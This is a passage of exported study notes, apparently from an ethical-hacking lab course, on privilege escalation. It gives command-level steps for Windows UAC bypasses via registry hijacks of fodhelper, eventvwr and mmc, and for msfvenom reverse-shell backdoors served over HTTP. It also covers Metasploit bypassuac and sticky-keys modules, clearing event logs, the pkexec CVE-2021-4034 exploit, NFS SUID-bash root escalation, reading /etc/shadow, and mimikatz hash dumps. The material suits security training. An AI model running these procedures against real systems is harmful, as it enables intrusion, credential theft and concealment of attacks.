</code></pre><p id="90f85a7f-15cb-4f01-a462-3f5ac48720f2" class=""><strong>Exploitation</strong>:</p><ol type="1" id="9adc6d5e-8176-4809-8cf4-2527e87c6ee0" class="numbered-list" start="1"><li>Modify the registry key to point to a malicious executable.</li></ol><ol type="1" id="e7db08b5-cda1-435e-b8cf-0c7a51100910" class="numbered-list" start="2"><li>Trigger <code>fodhelper.exe</code> to execute the payload.</li></ol><p id="ac616028-fb1e-4447-ba02-ac3ff9a5543e" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d8677c7b-4bf0-44e9-89b4-a7c43ad882cb" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;C:\path\to\malicious.exe&quot; /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute /f
Start-Process fodhelper.exe

</code></pre><h3 id="52d5dcdd-51d3-4823-9538-84f9927f7cec" class="">4. <strong>Event Viewer (eventvwr.exe)</strong></h3><p id="9215c5f9-7605-41e5-b97d-37928ae9a17a" class=""><strong>Description</strong>: A built-in Windows utility to view event logs.</p><p id="a8a6a839-806f-4ef9-89d7-03ded9514d08" class=""><strong>Exploitation</strong>:</p><ol type="1" id="f3bdb51e-5f5c-4c89-8dc6-006655af53b3" class="numbered-list" start="1"><li>Modify the registry to point the default handler for .msc files to a malicious executable.</li></ol><ol type="1" id="2638f3fc-9be8-4c20-b89e-fd73ebb796ad" class="numbered-list" start="2"><li>Trigger <code>eventvwr.exe</code>, which will load the malicious executable.</li></ol><p id="87624c36-43c5-47cd-86a3-af9c5e93203b" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1aa5911-b3f4-45fc-94ba-1200c4f5169f" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
reg add HKCU\Software\Classes\mscfile\shell\open\command /d &quot;C:\path\to\malicious.exe&quot; /f
Start-Process eventvwr.exe

</code></pre><h3 id="9c229495-7fc2-4eef-9e0f-e3d998fa297c" class="">5. <strong>Microsoft Management Console (mmc.exe)</strong></h3><p id="720bc339-ad73-4eea-a893-746134ddc067" class=""><strong>Description</strong>: A framework that provides a graphical user interface and a programming framework.</p><p id="dca2e6d6-cdb7-4b3c-b2be-d2bf49d7b8bf" class=""><strong>Exploitation</strong>:</p><ol type="1" id="fb34aeb1-b85a-4b2c-9759-62c707611abd" class="numbered-list" start="1"><li>Similar to Event Viewer, modify the registry to point the default handler for .msc files to a malicious executable.</li></ol><ol type="1" id="14b7e981-a766-49ed-9d5e-60a482e57afd" class="numbered-list" start="2"><li>Trigger <code>mmc.exe</code>.</li></ol><p id="2fee34c4-15c8-41b0-bfda-e568abd5ce18" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f26a607-d57d-483b-b749-ac861f8ebfa8" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
reg add HKCU\Software\Classes\mscfile\shell\open\command /d &quot;C:\path\to\malicious.exe&quot; /f
Start-Process mmc.exe

</code></pre><h3 id="e6a5ddb0-3f53-4488-b9e3-dd24337da842" class="">6. <strong>FODHelper (fodhelper.exe)</strong></h3><p id="35834569-b3be-4dc7-996d-040624ecf3b4" class=""><strong>Description</strong>: Used to manage optional features in Windows.</p><p id="e138f26c-9333-4d33-9b2b-dbce7df0c5f3" class=""><strong>Registry Key</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de23b5d6-7ca1-452b-9aaa-a4420dc18480" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
HKCU\Software\Classes\ms-settings\shell\open\command

</code></pre><p id="b6b4be42-64ab-4557-aedd-d485c1df6bfc" class=""><strong>Exploitation</strong>:</p><ol type="1" id="ade49b33-cee0-4c3e-88f5-75e9a22ec589" class="numbered-list" start="1"><li>Modify the registry key to point to a malicious executable.</li></ol><ol type="1" id="8eb3d455-1e5c-4c5a-b99b-c423085c5792" class="numbered-list" start="2"><li>Trigger <code>fodhelper.exe</code> to execute the payload.</li></ol><p id="422faabe-898b-426a-8596-5fc22a646619" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1d2ed5c-a071-4fe2-8a3a-7ecf1c4b0cbb" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;C:\path\to\malicious.exe&quot; /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute /f
Start-Process fodhelper.exe
</code></pre></details></li></ul><p id="ada4c8f0-0253-4ec0-989e-1f3b8382c0e1" class="">
</p><ul id="9d49bd01-c414-402c-ac0f-f4b6c201d39c" class="bulleted-list"><li style="list-style-type:disc">Type <code>background</code> to set the current session to the background<ul id="a6fc8dd1-1eb6-4e2d-a05a-4ba8da6f8fec" class="bulleted-list"><li style="list-style-type:circle"><code>sessions -i &lt;session no&gt;</code> to bring it back</li></ul></li></ul><ul id="3b84f835-f73c-4560-a98d-63d57705f0b4" class="bulleted-list"><li style="list-style-type:disc"><code><strong>exploit/windows/local/bypassuac_fodhelper</strong></code></li></ul><ul id="0acdfdaf-e0c8-4377-ae8a-fa9b68c831e7" class="bulleted-list"><li style="list-style-type:disc"><code>set session 1</code></li></ul><ul id="cc7e7a1c-1095-40ab-aaba-7ea6af398bd1" class="bulleted-list"><li style="list-style-type:disc"><code><strong>set payload windows/meterpreter/reverse_tcp</strong></code></li></ul><ul id="a418a98b-b4d5-46b5-ac79-92f793b69f3e" class="bulleted-list"><li style="list-style-type:disc"><code>exploit</code></li></ul><ul id="08d9b5a9-0a88-4347-bcc4-92b5ad9c2b54" class="bulleted-list"><li style="list-style-type:disc">Now if you run <code>getuid</code> you are admin</li></ul><ul id="ba3049d2-2c7d-4ad6-839d-5e5778eacaca" class="bulleted-list"><li style="list-style-type:disc">Now you can run <code>getsystem -t 1</code> to escalate privileges</li></ul><ul id="04e57c73-3c5b-4a19-90af-534379e268f8" class="bulleted-list"><li style="list-style-type:disc">Now you can dump SAM file</li></ul></details></li></ul><ul id="e2cb73d0-68fa-4350-98d7-e009d4b1adb0" class="toggle"><li><details open=""><summary>Clear event logs</summary><ul id="67bc33c8-d0d6-47d0-86bb-f89a1c2dcb8d" class="bulleted-list"><li style="list-style-type:disc">Run <code>clearev</code> in meterpreter</li></ul></details></li></ul><ul id="ba21a26c-2f9f-40a6-9f1c-f51f709bef78" class="toggle"><li><details open=""><summary>exploiting the <strong>pkexec CVE-2021-4034</strong> linux vulnerability</summary><p id="64c5ad04-07db-45f3-be09-2db6b6007147" class="">This is PolicyKit vulnerability</p><p id="39f735a2-19aa-4c5b-8f86-76bc6e66ef65" class=""><strong>Root Cause</strong>: The vulnerability typically arises due to improper handling or sanitization of environment variables passed to <code>pkexec</code>.<br/><br/>By carefully crafting environment variables, the attacker can manipulate the execution flow of <br/><code>pkexec</code> to execute arbitrary commands with root privileges<br/><br/></p><p id="b56c9b4f-168a-4182-93f5-61a7ad0a7c07" class="">This vulnerability has already been patched in newer versions of Unix-based operating systems.</p><ul id="3df96a09-36be-4da9-a012-14234677dd22" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a> download it here</li></ul><ul id="5abf0049-be13-4cd0-997c-2a89f2c4879b" class="bulleted-list"><li style="list-style-type:disc"><code>cd</code> to folder</li></ul><ul id="d40118ac-1466-4667-b753-946802e417a0" class="bulleted-list"><li style="list-style-type:disc"><code>make</code> </li></ul><ul id="4711c48a-2bd1-4897-a50f-516415e8ea27" class="bulleted-list"><li style="list-style-type:disc">run <code>cve-2021-4034</code></li></ul><ul id="004ff4b9-0850-4f03-95e3-d357758052e1" class="bulleted-list"><li style="list-style-type:disc"><code>whoami</code></li></ul><p id="908a7d70-229d-4e68-a517-54ee2182bf40" class="">
</p><p id="36bc0ba9-64e8-4a00-909d-760516e3aef7" class=""><br/><br/></p><p id="67125f96-7c21-4bfd-9c63-66fd8ae5dfbf" class="">
</p></details></li></ul><ul id="45873f7c-e47c-48b0-bb9f-658f13bc8946" class="toggle"><li><details open=""><summary>exploiting misconfigured NFS in linux for privesc</summary><ul id="fe2a6eba-4de1-4041-9c8e-5d4dee33c293" class="toggle"><li><details open=""><summary>Install an make server vulnerable</summary><ul id="a59a6317-76b9-4135-b44e-a3b5c15afc43" class="bulleted-list"><li style="list-style-type:disc"><code><strong>sudo apt install nfs-kernel-server</strong></code></li></ul><ul id="e1cc8fcf-f526-436f-bf1f-e87cb8551105" class="bulleted-list"><li style="list-style-type:disc"><code><strong>sudo nano /etc/exports</strong></code></li></ul><ul id="396fb3aa-64a0-4b1b-8d2a-1262be6169df" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>/home *(rw,no_root_squash)</strong></code><ul id="a3ae13da-daec-4ae5-a896-e3bb755e864f" class="bulleted-list"><li style="list-style-type:circle">This entry shows that <strong>/home</strong> directory is shared and allows the root user on the client to access files and perform <strong>read/write</strong> operations. </li></ul><ul id="ee87dd8f-1f8d-400b-a008-674e47e7aae8" class="bulleted-list"><li style="list-style-type:circle">The <strong>*</strong> sign denotes connection from any host machine.</li></ul></li></ul><ul id="3d8bb39f-a787-43c1-9106-497b5abac00a" class="bulleted-list"><li style="list-style-type:disc">Restart server<strong> </strong><code><strong>sudo /etc/init.d/nfs-kernel-server restart</strong></code></li></ul></details></li></ul><ul id="79e807d6-47b0-4f80-b0cc-2ef89d6ba968" class="toggle"><li><details open=""><summary>Gain local privesc through NFS misconfig</summary><p id="1986a1d9-c763-4396-b1bc-6dcd5d6202bb" class="">The nfs allows root writing on directory so we are using this to gain privesc</p><ul id="419e4401-6d6e-45f1-8eae-7fb2e6ac64cf" class="toggle"><li><details open=""><summary>Identify if NFS is available</summary><ul id="d1e4c141-7459-4603-a4b6-c8ea75aef50a" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>nmap -sV &lt;target&gt;</strong></code><strong> </strong>on attacker machine</li></ul><ul id="2ad92e1e-183c-4598-8d08-ad51eb78886b" class="bulleted-list"><li style="list-style-type:disc">Will show port <code>2049</code> open with name <code>nfs_acl 3</code> </li></ul></details></li></ul><ul id="c1c7cfc7-c8a7-4c10-9233-3472fd985fa2" class="toggle"><li><details open=""><summary>Install client to mount and unmount nfs shares </summary><ul id="caa3c923-f074-4ce2-bc77-543590242ce9" class="bulleted-list"><li style="list-style-type:disc"><code>sudo apt-get install nfs-common</code></li></ul></details></li></ul><ul id="ecc5141d-5196-4385-9c52-b90ed9753712" class="toggle"><li><details open=""><summary>Identify any available shares on target</summary><ul id="95e7107b-6756-4622-9de8-1aacf381ea30" class="bulleted-list"><li style="list-style-type:disc"><code>showmount -e &lt;target&gt;</code><ul id="5782bd0f-978c-4844-b93e-ff1c13b9c94e" class="bulleted-list"><li style="list-style-type:circle">We can see <code>/home *</code> so this dir is mountable in this case</li></ul></li></ul><ul id="0cce3089-a75f-45fe-b581-fb5b655e74b1" class="bulleted-list"><li style="list-style-type:disc">If you receive <code>clnt_create: RPC: Program not ergistered</code><ul id="08c7b71a-6688-4037-a915-a9398cd6047f" class="bulleted-list"><li style="list-style-type:circle">Reboot target machine</li></ul><ul id="6c212c69-fe44-41d1-92e3-e565460c5ca2" class="bulleted-list"><li style="list-style-type:circle">Type <code>sudo /etc/init.d/nfs-kernel-server restart</code></li></ul></li></ul></details></li></ul><ul id="adf3bc32-73d0-400b-baac-7a8065634c58" class="toggle"><li><details open=""><summary>Mount available nfs share</summary><ul id="3970e8d2-9b7c-4850-a091-b7dd90a99dac" class="bulleted-list"><li style="list-style-type:disc">Type <code>mkdir /tmp/nfs</code></li></ul><ul id="9a32fb46-99d4-4aba-a75c-aa323a32d8a1" class="bulleted-list"><li style="list-style-type:disc">Type <code>sudo mount -t nfs &lt;target&gt;:/&lt;available dir&gt; /tmp/nfs</code><ul id="b1c3f994-59b8-4306-9496-81ccc443dd30" class="bulleted-list"><li style="list-style-type:circle">in this case the dir is home</li></ul></li></ul><ul id="49f6c120-945d-4239-8427-94d916be8744" class="bulleted-list"><li style="list-style-type:disc">Type <code>cd /tmp/nfs</code></li></ul></details></li></ul><ul id="433c0508-ef0e-4c48-b0b9-005c61dd28cf" class="toggle"><li><details open=""><summary>Create a local bash executable with s permissions</summary><ul id="1f1bfd46-1954-45c9-bed0-a92d1ac62c0a" class="bulleted-list"><li style="list-style-type:disc">Type <code>sudo cp /bin/bash</code></li></ul><ul id="6def832d-6582-4aff-ab72-8b857798867c" class="bulleted-list"><li style="list-style-type:disc"><code>sudo chmod +s bash</code></li></ul></details></li></ul><ul id="4ffb6a8d-0634-4c17-a331-0ea335c3db81" class="toggle"><li><details open=""><summary>Connect remotely using ssh</summary><ul id="65827edc-6a5c-496f-ba3e-4ca8b39f7cbb" class="bulleted-list"><li style="list-style-type:disc">ssh -l ubuntu &lt;target&gt;<ul id="0ee45cef-a708-4e4f-8603-a34c0ea91777" class="bulleted-list"><li style="list-style-type:circle">Note we are using the <code>ubuntu</code> account not root</li></ul></li></ul></details></li></ul><ul id="0a7b2f41-931c-4d42-a5ed-1167d944c278" class="toggle"><li><details open=""><summary>Gain root</summary><ul id="32f19377-4147-4c9b-a078-d86233811b77" class="bulleted-list"><li style="list-style-type:disc"><code>cd /home</code> where the bash script we created through nfs is saved</li></ul><ul id="f67bfe8e-45c1-48c6-a77f-fa530f08a36d" class="bulleted-list"><li style="list-style-type:disc">run <code>./bash -p</code></li></ul><ul id="52e19909-f329-4dcc-8dfd-87dbe4f400f8" class="bulleted-list"><li style="list-style-type:disc"><code>whoami</code></li></ul></details></li></ul><ul id="a5a04ce5-81c4-4417-90b6-5cbfd43a44f6" class="toggle"><li><details open=""><summary>Gain hashes for users</summary><p id="f723f394-6633-4096-b8d7-b6ebd25320f4" class="">This can also be done directly since we already have root</p><p id="5be98635-1a91-4f28-9b1b-e2b20d6beec5" class="">But the example is to be done through nfs shares to privesc</p><ul id="f0a9e3f1-8b41-445c-aee9-a1a6578e6bd9" class="bulleted-list"><li style="list-style-type:disc"><code>cp /bin/nano .</code></li></ul><ul id="60b06368-b06a-4be2-9dd1-392bf6cf62c3" class="bulleted-list"><li style="list-style-type:disc"><code>chmod 4777 nano</code></li></ul><ul id="256c31a6-2bac-4c6c-b8e1-38e288d2b1c9" class="bulleted-list"><li style="list-style-type:disc"><code>ls -la nano</code></li></ul><ul id="39f6457f-dfe8-47fa-bb57-390485adf497" class="bulleted-list"><li style="list-style-type:disc"><code>./nano -p /etc/shadow</code></li></ul></details></li></ul><ul id="07cc581b-9776-4b7a-a2b7-2a12d377d9ce" class="toggle"><li><details open=""><summary>Other actions you can do after linux privesc</summary><ul id="7616bd5a-d420-4af1-b428-0b6eff77dcd2" class="bulleted-list"><li style="list-style-type:disc"><code>cat /etc/crontab</code><ul id="83a65a85-5155-48a1-b3b4-7c94b90b9497" class="bulleted-list"><li style="list-style-type:circle">view cron jobs</li></ul></li></ul><ul id="a08b20bb-65a1-46d8-84a1-dc853c4e2fd8" class="bulleted-list"><li style="list-style-type:disc"><code>ps -ef</code> <ul id="0d1ff14e-fe82-4ef2-8ac9-17edef2c05fd" class="bulleted-list"><li style="list-style-type:circle">view processes</li></ul></li></ul><ul id="43e86ec1-5a4c-444a-ab79-064af718e77d" class="bulleted-list"><li style="list-style-type:disc"><code>find / -name &quot;*txt&quot; -ls 2&gt;dev/null</code><ul id="1fd2e516-ac47-4d8c-b160-e38f30aa4930" class="bulleted-list"><li style="list-style-type:circle">view text files on the system</li></ul></li></ul><ul id="90a21195-cb84-4051-b9c6-5dd8dd750676" class="bulleted-list"><li style="list-style-type:disc"><code>route -n</code><ul id="73ea34b0-579f-4196-9506-b50a4d1a8744" class="bulleted-list"><li style="list-style-type:circle">view network interfaces and IPs</li></ul></li></ul><ul id="d2168479-1f8e-468c-8cb3-abe8033e52b7" class="bulleted-list"><li style="list-style-type:disc"><code>find / -perm -4000 ls 2&gt;/dev/null</code><ul id="de596afa-3a05-44a9-bc6c-02dc10be73ca" class="bulleted-list"><li style="list-style-type:circle">find SUID executable binaries</li></ul></li></ul><p id="d212dffe-a640-4abf-8b74-feaf65749f64" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="7269ae2d-b7f6-4b6b-834c-35044c4bb8de" class="toggle"><li><details open=""><summary>Privesc by Bypassing UAC and exploiting sticky keys</summary><ul id="78e5c9aa-7387-4e50-9cb4-a87f5b5c8bac" class="toggle"><li><details open=""><summary>Gain local user remote connection to Windows</summary><ul id="7b8541aa-9794-4c35-99af-46402e31fb3e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Windows.exe</strong></code></li></ul><ul id="9d556a53-4101-4b4a-837c-e91be2f53a81" class="bulleted-list"><li style="list-style-type:disc"><code>python3 -m http.server</code></li></ul><ul id="4c9b6fe9-60fd-4e23-90d7-db64f559ccfa" class="bulleted-list"><li style="list-style-type:disc"><code>msfconsole</code></li></ul><ul id="6538f509-1b37-46c2-b2f7-d969f152c6c6" class="bulleted-list"><li style="list-style-type:disc"><code><strong>use exploit/multi/handler</strong></code></li></ul><ul id="d8445e42-24e9-44a7-8b43-61b29b4004fe" class="bulleted-list"><li style="list-style-type:disc"><code><strong>set payload windows/meterpreter/reverse_tcp</strong></code></li></ul><ul id="b6e86c5b-847b-422f-aaea-b5a361ce2aef" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost</code></li></ul><ul id="f0dce543-cf5e-4ff9-bf9a-3c0bd7a12e71" class="bulleted-list"><li style="list-style-type:disc"><code>set lport</code></li></ul><ul id="1a41543a-734f-425e-80f2-4a7d5b057e30" class="bulleted-list"><li style="list-style-type:disc"><code>run</code></li></ul><ul id="d33076c5-a57f-4b34-90f8-75c3f7cd41bb" class="bulleted-list"><li style="list-style-type:disc">Run executable from windows</li></ul><ul id="bbd586f9-ef84-4acb-b44a-f399e8920100" class="bulleted-list"><li style="list-style-type:disc"><code>getuid</code></li></ul><ul id="a88c1dc1-3e56-4018-9059-8dd35683c562" class="bulleted-list"><li style="list-style-type:disc"><code>background</code></li></ul></details></li></ul><ul id="13bdd10f-73ce-48ef-b1c2-5c92315f41c3" class="toggle"><li><details open=""><summary>Bypass UAC and elevate privileges</summary><p id="5978c77c-228a-496b-ae37-79addea66de4" class="">Its a methodology so that we bypass the screen where confirmation (Yes) is needed to run administrative tasks</p><p id="6d7ad72f-2180-4cbc-971e-ae84cd40e99d" class="">User needs to be in Administrators group</p><ul id="9da323aa-8c38-4118-8cc1-9d1cc4d7cbb1" class="bulleted-list"><li style="list-style-type:disc">Search on metasploit<ul id="126047aa-8f48-4f73-af2a-3474d6e4eae9" class="bulleted-list"><li style="list-style-type:circle"><code>search bypassuac</code></li></ul></li></ul><ul id="303f095e-550d-4eff-a3d9-9da588a40901" class="bulleted-list"><li style="list-style-type:disc">Config and run bypass<ul id="7f91712c-b273-4149-a3fd-e63b7685bdfc" class="bulleted-list"><li style="list-style-type:circle"><code><strong>use exploit/windows/local/bypassuac_fodhelper</strong></code><ul id="27e5b0f6-add6-4d8d-9938-041cc1e7363a" class="bulleted-list"><li style="list-style-type:square">Its a bypass method that uses trusted binaries (like fodhelper) to escalate privilages</li></ul></li></ul><ul id="8116bf10-539c-48bc-90f2-51bf37d2b764" class="bulleted-list"><li style="list-style-type:circle"><code>session 1</code></li></ul><ul id="685c3d38-8b03-453b-b5fd-0843b2419d8f" class="bulleted-list"><li style="list-style-type:circle"><code>set lhost</code></li></ul><ul id="0078bb89-3223-419e-beb6-7e59f80d19a2" class="bulleted-list"><li style="list-style-type:circle"><code>set target 0</code> (windows x86)</li></ul><ul id="93472f4e-fb6f-404e-bdb5-4f03281e790f" class="bulleted-list"><li style="list-style-type:circle"><code>exploit</code></li></ul></li></ul><ul id="1fdeb3c8-f6db-4bde-82eb-c63c06784f84" class="bulleted-list"><li style="list-style-type:disc">Elevate privileges<ul id="a796802b-6df4-47d4-997d-5dc0ba9213fa" class="bulleted-list"><li style="list-style-type:circle"><code>getsystem -t 1</code></li></ul><ul id="acb72808-48f3-4cba-b852-e2c361a44e2f" class="bulleted-list"><li style="list-style-type:circle"><code>getuid</code><ul id="cfb40568-7f2c-4135-9312-9064495883f0" class="bulleted-list"><li style="list-style-type:square">should show NT AUTHORITY\SYSTEM</li></ul></li></ul></li></ul></details></li></ul><ul id="3a3aedad-bab0-4932-a912-26ac303f4f78" class="toggle"><li><details open=""><summary>Exploit sticky keys</summary><ul id="3cc83307-e24f-4ce1-9611-d1bd5a39c68a" class="bulleted-list"><li style="list-style-type:disc">Use sticky key exploit to show command prompt on lock screen with pressing sticky keys 5 times<ul id="72dab65f-f399-480d-8923-ae2e181da1f6" class="bulleted-list"><li style="list-style-type:circle"><code>use post/windows/manage/sticky_keys</code></li></ul></li></ul><ul id="5b248b75-58d1-4fc4-9ae3-00134f0d3512" class="bulleted-list"><li style="list-style-type:disc">Find and use session<ul id="809db62d-370b-4d1f-87df-c360b079c5f9" class="bulleted-list"><li style="list-style-type:circle"><code>sessions -i</code></li></ul><ul id="ba7b6497-7d23-4b85-b1aa-9688c6732523" class="bulleted-list"><li style="list-style-type:circle">Choose the id of the session we got NT AUTHORITY access level</li></ul><ul id="02e4bae4-f21a-4814-85eb-da5f1062cad1" class="bulleted-list"><li style="list-style-type:circle"><code>set session 2</code> or the corresponding session</li></ul></li></ul><ul id="0d3e7c58-185b-4178-b29a-b32369cb6472" class="bulleted-list"><li style="list-style-type:disc"><code>exploit</code></li></ul><ul id="0be58cd3-63a3-447b-baa1-a81d2896ce52" class="bulleted-list"><li style="list-style-type:disc">Observe the result<ul id="a5ff79a9-31b8-4fcf-bf69-1f14e51b74a7" class="bulleted-list"><li style="list-style-type:circle">Go to victim</li></ul><ul id="97c5edf4-af67-4c70-8d42-96b34098d2aa" class="bulleted-list"><li style="list-style-type:circle">Sign in as a user without admin privileges</li></ul><ul id="cac0e0f8-a105-4f40-bddb-190753bc7ed7" class="bulleted-list"><li style="list-style-type:circle">Lock the system</li></ul><ul id="e9eee345-f0d8-4da5-820c-733b4b1986b5" class="bulleted-list"><li style="list-style-type:circle">Press the Shift key 5 times</li></ul><ul id="ff36e7c5-fc83-4d0c-9cc1-73b49172d980" class="bulleted-list"><li style="list-style-type:circle">A command prompt with NT AUTHORITY privileges will open up instead of sticky keys</li></ul></li></ul></details></li></ul><p id="c525e37c-328c-4bdf-85c5-e810d9e5ad77" class="">
</p></details></li></ul><ul id="82212818-cff1-42ab-a9eb-015d4316bc27" class="toggle"><li><details open=""><summary>Escalate privileges to gather hashdump using mimikatz</summary><ul id="9f92f9dd-aed4-44a2-bf48-cf8c13e63f42" class="toggle"><li><details open=""><summary>Get remote access on the system</summary><ul id="07bdd165-6c47-4b53-930f-36d1cd43532e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/backdoor.exe</strong></code></li></ul><ul id="27d75963-ad46-49dc-b466-5c7004d55a9d" class="bulleted-list"><li style="list-style-type:disc"><code>python -m http.server</code></li></ul><ul id="0590f7d2-9c09-4216-9c53-6c41ec8773ca" class="bulleted-list"><li style="list-style-type:disc"><code>msfconsole</code></li></ul><ul id="9d023b47-e33f-444d-b462-6baa164e4b6b" class="bulleted-list"><li style="list-style-type:disc"><code>use exploit/multi/handler</code></li></ul><ul id="e4f4e7fc-d450-4919-b0e1-0f25a37a7693" class="bulleted-list"><li style="list-style-type:disc"><code><strong>set payload windows/meterpreter/reverse_tcp</strong></code></li></ul><ul id="67a714bf-22ea-4faa-a8df-ec5a63e357b5" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost</code></li></ul><ul id="8ad66b48-de46-4d47-94bb-e155c99cb4dd" class="bulleted-list"><li style="list-style-type:disc"><code>set lport</code></li></ul><ul id="08525f20-0a6a-4bd8-86c9-b9b616c8eb9b" class="bulleted-list"><li style="list-style-type:disc"><code>run</code></li></ul><ul id="9425354e-58d0-4d74-9e77-2315db740958" class="bulleted-list"><li style="list-style-type:disc">Go to victim</li></ul><ul id="312938b9-cca1-4b89-8782-5b7963f115b3" class="bulleted-list"><li style="list-style-type:disc">Go to <code>10.10.1.13:800</code> attackers IP</li></ul><ul id="a7d197cb-1e2c-4c07-9038-5428b65aa5df" class="bulleted-list"><li style="list-style-type:disc">Download and run <code>backdoor.exe</code></li></ul></details></li></ul><ul id="9fc440a8-44e1-4d1e-8096-c57781d58dcd" class="toggle"><li><details open=""><summary>Bypass UAC and elevate privileges</summary><ul id="7f6dd751-93d2-4c6e-984f-deff82b70e76" class="bulleted-list"><li style="list-style-type:disc"><code>background</code> </li></ul><ul id="e71f7e02-0b32-4e3b-bb0b-6285b6273fd9" class="bulleted-list"><li style="list-style-type:disc"><code><strong>use exploit/windows/local/bypassuac_fodhelper</strong></code></li></ul><ul id="9724cb5b-78c3-44c8-8a09-c0cbc2a69217" class="bulleted-list"><li style="list-style-type:disc"><code>set session 1</code></li></ul><ul id="404b5365-585f-4d25-be3d-d6c958e2378d" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost</code></li></ul><ul id="718785e5-c779-4a6a-98c9-bce679c3c65b" class="bulleted-list"><li style="list-style-type:disc"><code>set lport</code></li></ul><ul id="219f4f5d-6273-4185-a1bb-b3b39d9be28b" class="bulleted-list"><li style="list-style-type:disc"><code>set target 0</code></li></ul><ul id="f518ed03-fbc4-4a97-9ca6-7fe8e900b674" class="bulleted-list"><li style="list-style-type:disc"><code>exploit</code></li></ul><ul id="a1093234-be43-42c1-b548-49165c318785" class="bulleted-list"><li style="list-style-type:disc"><code>getsystem -t 1</code></li></ul></details></li></ul><ul id="a4e02fd9-ed7c-4775-9934-1bd413b33277" class="toggle"><li><details open=""><summary>Use mimikatz to gather hashdump</summary><ul id="1c5967d4-695c-4cf3-9a17-3931c111e084" class="bulleted-list"><li style="list-style-type:disc">In the meterpreter session to start mimikatz<ul id="e346cd60-f4bd-4c9a-bd4e-0a1feca3a411" class="bulleted-list"><li style="list-style-type:circle"><code>load kiwi</code></li></ul><ul id="82b18359-b386-4e0c-93a4-0749ea48c92a" class="bulleted-list"><li style="list-style-type:circle"><code>help 